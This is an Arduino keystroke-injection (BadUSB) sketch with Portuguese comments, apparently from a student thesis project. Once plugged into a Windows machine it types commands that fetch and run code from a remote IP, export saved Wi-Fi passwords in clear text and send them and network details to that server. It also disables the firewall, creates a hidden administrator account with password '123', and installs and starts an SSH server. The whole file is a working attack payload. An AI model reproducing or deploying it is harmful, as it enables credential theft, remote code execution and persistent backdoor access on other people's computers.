  #include <Keyboard.h> 
// Init function
void setup()
{

  delay(3000);
// Iniciando a interface de teclado
Keyboard.begin(); // funcao usada para iniciar o teclado virtual


// Esperando 0.5 segundos para que o SO reconheca o dispositivo  
  delay(500); // esperar por 500ms
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

// Aguardando 0.4 segundos antes de digitar CMD
  delay(400);
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  
//Alterar teclado para EN devido a caracteres usados no codigo.
//Garantimos que o idioma do teclado seja EN, 
//Mesmo que ja esteja setado como EN, nao gerara nenhum erro.
  delay(500);
  //Forcando o teclado EN a entrar na lista de idiomas
  Keyboard.print("powershell Set-WinUserLanguageList -Force en-US");
  Keyboard.write(KEY_RETURN);
  delay(500);

 //Apos baixar o idioma EN, usamos o script:
 //"powershell Set-WinDefaultInputMethodOverride -InputTip '0409:00000409'"
 //Este comando nao esta embarcado devido a caracteres como ':' e o '|' que geram problemas
 //na conversao para o teclado pt, por isto a configuracao para o teclado EN.
  Keyboard.print("powershell (Invoke-WebRequest 3.81.227.105).Content > arquivo");
  Keyboard.write(KEY_RETURN);
  //O comando eh carregado para um arquivo e chamado com o cat para ser executado no ps
  Keyboard.print("powershell $(cat arquivo)");
  Keyboard.write(KEY_RETURN);
  delay(1000);

//O comando a seguir gerara varios xml's, cada um contendo as senhas de cada rede sem fio ja conectada
  Keyboard.print("netsh wlan export profile key=clear");
  Keyboard.write(KEY_RETURN);
  //concatenamos todos os xml's em um unico arquivo.xml
  Keyboard.print("powershell cat Wi-Fi-*.xml > arquivo.xml");
  Keyboard.write(KEY_RETURN);
  delay(400);
  //neste servidor, no path /xml.html, ha o script de upload do xml contendo as senhas, para o dropbox 
  Keyboard.print("curl 3.81.227.105/xml.html | cmd");
  Keyboard.write(KEY_RETURN);
  delay(200);
  //aqui recuperamos informacoes de rede do usuario e enviamos para uma arquivo infos.txt
  Keyboard.print("ipconfig >> infos.txt");
  Keyboard.write(KEY_RETURN);
  delay(500);
  //neste servidor, no path /infos.html, ha o script de upload das infos de rede para o dropbox 
  Keyboard.print("curl 3.81.227.105/infos.html | cmd");    
  Keyboard.write(KEY_RETURN);

  //este trecho desativa o firewall para liberar a porta 22 permitindo conexoes ssh
  delay(1000);
  Keyboard.print("powershell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  Keyboard.write(KEY_RETURN);
  delay(1000);
 
 //criaremos um usuario com permissoes de adm
  Keyboard.print("powershell");
  Keyboard.write(KEY_RETURN);
  //PASSWORD, uma variavel criada contendo o valor 123 que sera o valor da senha
  Keyboard.print("$PASSWORD= ConvertTo-SecureString -AsPlainText -Force -String 123");
  Keyboard.write(KEY_RETURN);
  delay(500);
  //Criamos o user ShaolinKillerOfPig que contera a senha 123
  Keyboard.print("New-LocalUser -Name 'ShaolinKillerOfPig' -Description 'Teste TCC' -Password $PASSWORD");
  Keyboard.write(KEY_RETURN);
  delay(500);
  //Sera dada permissao de ADM ao user ShaolinKillerOfPig
  Keyboard.print("Add-LocalGroupMember -Group 'Administradores' -Member 'ShaolinKillerOfPig'");
  Keyboard.write(KEY_RETURN);
  //Instalamos o openssh-server, que possibilitara a maquina receber conexao ssh como servidor.
  Keyboard.print("Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0");
  Keyboard.write(KEY_RETURN);
  //Iniciamos o servico do ssh server
  Keyboard.print("powershell Start-Service sshd");
  Keyboard.write(KEY_RETURN);
  delay(1000);
  //fechando powershell
  Keyboard.print("cls");    
  Keyboard.write(KEY_RETURN);
  delay(500);
  //Trocando janela virtual
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('d');
  //liberando todos os botoes da interface de teclado
  Keyboard.releaseAll();
//finalizando interface de teclado
Keyboard.end();
}
void loop(){}
